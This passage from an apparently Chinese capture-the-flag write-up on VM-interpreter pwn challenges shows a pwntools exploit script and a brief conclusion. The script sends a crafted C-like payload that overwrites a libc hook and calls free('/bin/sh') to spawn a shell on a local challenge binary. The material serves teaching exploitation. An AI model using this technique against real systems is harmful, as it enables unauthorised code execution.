+<span class="n">rud</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">p</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'DEBUG'</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'tmux'</span><span class="p">,</span><span class="s1">'split'</span><span class="p">,</span><span class="s1">'-h'</span><span class="p">]</span>
+<span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+<span class="n">libc_offset</span> <span class="o">=</span> <span class="mh">0x3c4b20</span>
+<span class="n">gadgets</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x45216</span><span class="p">,</span><span class="mh">0x4526a</span><span class="p">,</span><span class="mh">0xf02a4</span><span class="p">,</span><span class="mh">0xf1147</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">'b* 0x555555558724'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"I'm living..."</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'''main(){int a;a=0x12345677;*(&amp;a-161542)=&amp;a-620937;free("/bin/sh");}'''</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">exp</span><span class="p">()</span>
+</pre></div>
+<h2 data-content="1" id="f75a4bc4cfc66f44521c99c6176f8dc8">总结</h2>
+<p>从我们举的例题中可以看到汇编类的VMPwn核心是逆向和对于已有指令的组合，编译器类的VMPwn则需要动态的调试去寻找规律，相比于前者更加复杂。</p>
+</div>
+</div>
